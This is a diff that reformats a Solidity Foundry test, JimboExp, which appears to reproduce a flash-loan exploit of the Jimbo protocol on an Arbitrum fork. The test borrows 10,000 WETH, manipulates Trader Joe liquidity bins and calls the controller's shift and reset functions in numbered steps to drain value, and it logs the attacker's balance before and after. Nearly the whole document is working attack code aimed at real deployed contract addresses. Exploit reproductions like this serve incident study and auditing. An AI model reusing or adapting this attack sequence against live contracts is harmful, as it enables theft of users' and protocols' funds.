@@ -28,21 +28,20 @@ interface ILBPair {
 
     function getBin(uint24 id) external view returns (uint128 binReserveX, uint128 binReserveY);
 
-     function getSwapIn(uint128 amountOut, bool swapForY)
-        external
-        view
-        returns (uint128 amountIn, uint128 amountOutLeft, uint128 fee);
+    function getSwapIn(
+        uint128 amountOut,
+        bool swapForY
+    ) external view returns (uint128 amountIn, uint128 amountOutLeft, uint128 fee);
 }
 
 interface ILBRouter {
-
     enum Version {
         V1,
         V2,
         V2_1
     }
 
-     /**
+    /**
      * @dev The liquidity parameters, such as:
      * - tokenX: The address of token X
      * - tokenY: The address of token Y
@@ -83,6 +82,7 @@ interface ILBRouter {
      * - versions: The list of versions of the pairs to go through
      * - tokenPath: The list of tokens in the path to go through
      */
+
     struct Path {
         uint256[] pairBinSteps;
         Version[] versions;
@@ -107,15 +107,19 @@ interface ILBRouter {
         uint256 deadline
     ) external returns (uint256 amountOut);
 
-    function swapExactNATIVEForTokens(uint256 amountOutMin, Path memory path, address to, uint256 deadline)
-        external
-        payable
-        returns (uint256 amountOut);
+    function swapExactNATIVEForTokens(
+        uint256 amountOutMin,
+        Path memory path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256 amountOut);
 
-    function swapNATIVEForExactTokens(uint256 amountOut, Path memory path, address to, uint256 deadline)
-        external
-        payable
-        returns (uint256[] memory amountsIn);
+    function swapNATIVEForExactTokens(
+        uint256 amountOut,
+        Path memory path,
+        address to,
+        uint256 deadline
+    ) external payable returns (uint256[] memory amountsIn);
 
     function swapTokensForExactNATIVE(
         uint256 amountOut,
@@ -127,7 +131,6 @@ interface ILBRouter {
 }
 
 contract JimboExp is Test {
-    
     IJimboController controller = IJimboController(0x271944d9D8CA831F7c0dBCb20C4ee482376d6DE7);
     ILBPair pair = ILBPair(0x16a5D28b20A3FddEcdcaf02DF4b3935734df1A1f);
     ILBRouter router = ILBRouter(0xb4315e873dBcf96Ffd0acd8EA43f689D8c20fB30);
@@ -139,54 +142,39 @@ contract JimboExp is Test {
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
-
-
-
     function setUp() public {
-        cheats.createSelectFork("arbitrum", 95144404);
+        cheats.createSelectFork("arbitrum", 95_144_404);
         deal(address(this), 0);
     }
 
-
     function testExp() external {
         emit log_named_decimal_uint("[Start] Attacker WETH Balance", weth.balanceOf(address(this)), 18);
-        
-        weth.approve(address(pool), type(uint).max);
-        
+
+        weth.approve(address(pool), type(uint256).max);
 
         address[] memory assets = new address[](1);
         uint256[] memory amounts = new uint256[](1);
         uint256[] memory modes = new uint256[](1);
 
         assets[0] = address(weth);
-        amounts[0] = 10000 ether;
+        amounts[0] = 10_000 ether;
         modes[0] = 0;
 
-        pool.flashLoan(
-            address(this),
-            assets,
-            amounts,
-            modes,
-            address(0),
-            abi.encodePacked(uint16(0x3230)),
-            0
-        );
+        pool.flashLoan(address(this), assets, amounts, modes, address(0), abi.encodePacked(uint16(0x3230)), 0);
 
         emit log_named_decimal_uint("[End] Attacker WETH Balance", weth.balanceOf(address(this)), 18);
     }
 
-    
-
-   function executeOperation(
+    function executeOperation(
         address[] calldata assets,
         uint256[] calldata amounts,
         uint256[] calldata premiums,
         address initiator,
         bytes calldata params
     ) external returns (bool) {
-        weth.approve(address(router), type(uint).max);
-        Jimbo.approve(address(router), type(uint).max);
-        weth.withdraw(10000 ether);
+        weth.approve(address(router), type(uint256).max);
+        Jimbo.approve(address(router), type(uint256).max);
+        weth.withdraw(10_000 ether);
 
         // Step1: add Liquidity to a high bin
         uint256[] memory steps = new uint256[](1);
@@ -198,17 +186,8 @@ contract JimboExp is Test {
         tokenPath[0] = IERC20(address(weth));
         tokenPath[1] = Jimbo;
 
-        ILBRouter.Path memory path = ILBRouter.Path(
-            steps,
-            version,
-            tokenPath
-        );
-        router.swapNATIVEForExactTokens{value: 10 ether}(
-            1 ether,
-            path,
-            address(this),
-            block.timestamp + 100
-        );
+        ILBRouter.Path memory path = ILBRouter.Path(steps, version, tokenPath);
+        router.swapNATIVEForExactTokens{value: 10 ether}(1 ether, path, address(this), block.timestamp + 100);
 
         uint24 activeId = pair.getActiveId();
         uint256 amount1 = Jimbo.balanceOf(address(this));
@@ -219,7 +198,7 @@ contract JimboExp is Test {
 
         deltaIds[0] = int256(uint256(uint24((1 << 23) - 1) - activeId));
         distributionX[0] = 1e18;
-        distributionY[0] = 0;   
+        distributionY[0] = 0;
 
         ILBRouter.LiquidityParameters memory parameter1 = ILBRouter.LiquidityParameters(
             Jimbo,
@@ -252,10 +231,7 @@ contract JimboExp is Test {
         }
 
         router.swapNATIVEForExactTokens{value: address(this).balance}(
-            amountOut + 1,
-            path,
-            address(this),
-            block.timestamp + 100
+            amountOut + 1, path, address(this), block.timestamp + 100
         );
         activeId = pair.getActiveId();
         triggerBin = controller.triggerBin();
@@ -263,55 +239,44 @@ contract JimboExp is Test {
 
         // Step3: shift
         controller.shift();
-        
+
         // Step4: buy All normal Jimbo
-       amountOut = 0;
+        amountOut = 0;
         for (uint24 j = 0; j <= 50; ++j) {
             (uint128 binReserveX, uint128 binReserveY) = pair.getBin(j + activeId);
             amountOut += binReserveX;
-            
         }
         // (uint128 binReserveX,) = pair.getBin(activeId1 + 896);
         // amountOut += uint256(binReserveX / 2);
         router.swapNATIVEForExactTokens{value: address(this).balance}(
-            amountOut + 1,
-            path,
-            address(this),
-            block.timestamp + 100
+            amountOut + 1, path, address(this), block.timestamp + 100
         );
 
-        require(pair.getActiveId() == 8388607, "wrong");
+        require(pair.getActiveId() == 8_388_607, "wrong");
 
         // Step5: shift back
         Jimbo.transfer(address(controller), 100);
         controller.shift();
 
         uint24 anchorBin = controller.anchorBin();
-        
+
         path.tokenPath[1] = path.tokenPath[0];
         path.tokenPath[0] = Jimbo;
 
         while (pair.getActiveId() >= anchorBin) {
             amountOut = 0;
-            for (uint24 j = pair.getActiveId(); j >= anchorBin; -- j) {
+            for (uint24 j = pair.getActiveId(); j >= anchorBin; --j) {
                 (, uint128 binReserveY) = pair.getBin(j);
                 amountOut += binReserveY;
             }
-            (uint amountIn,,) = pair.getSwapIn(uint128(amountOut), true);
-            router.swapExactTokensForNATIVE(
-                amountIn + 1,
-                0,
-                path,
-                payable(this),
-                block.timestamp + 100
-            );
+            (uint256 amountIn,,) = pair.getSwapIn(uint128(amountOut), true);
+            router.swapExactTokensForNATIVE(amountIn + 1, 0, path, payable(this), block.timestamp + 100);
         }
-        
+
         require(pair.getActiveId() < anchorBin, "wrong2");
 
         // Step6 reset to be plain
         controller.reset();
-        
 
         // Step7: buy to High again
         activeId = pair.getActiveId();
@@ -324,13 +289,10 @@ contract JimboExp is Test {
         path.tokenPath[1] = Jimbo;
 
         router.swapNATIVEForExactTokens{value: address(this).balance}(
-            amountOut + 1,
-            path,
-            address(this),
-            block.timestamp + 100
+            amountOut + 1, path, address(this), block.timestamp + 100
         );
-        
-         // Step8: shift back
+
+        // Step8: shift back
         Jimbo.transfer(address(controller), 100);
         controller.shift();
 
@@ -338,13 +300,7 @@ contract JimboExp is Test {
         path.tokenPath[1] = path.tokenPath[0];
         path.tokenPath[0] = Jimbo;
 
-        router.swapExactTokensForNATIVE(
-            Jimbo.balanceOf(address(this)),
-            0,
-            path,
-            payable(this),
-            block.timestamp + 100
-        );
+        router.swapExactTokensForNATIVE(Jimbo.balanceOf(address(this)), 0, path, payable(this), block.timestamp + 100);
 
         // end
         weth.deposit{value: address(this).balance}();
@@ -353,7 +309,4 @@ contract JimboExp is Test {
     }
 
     receive() external payable {}
-    
 }
-
-
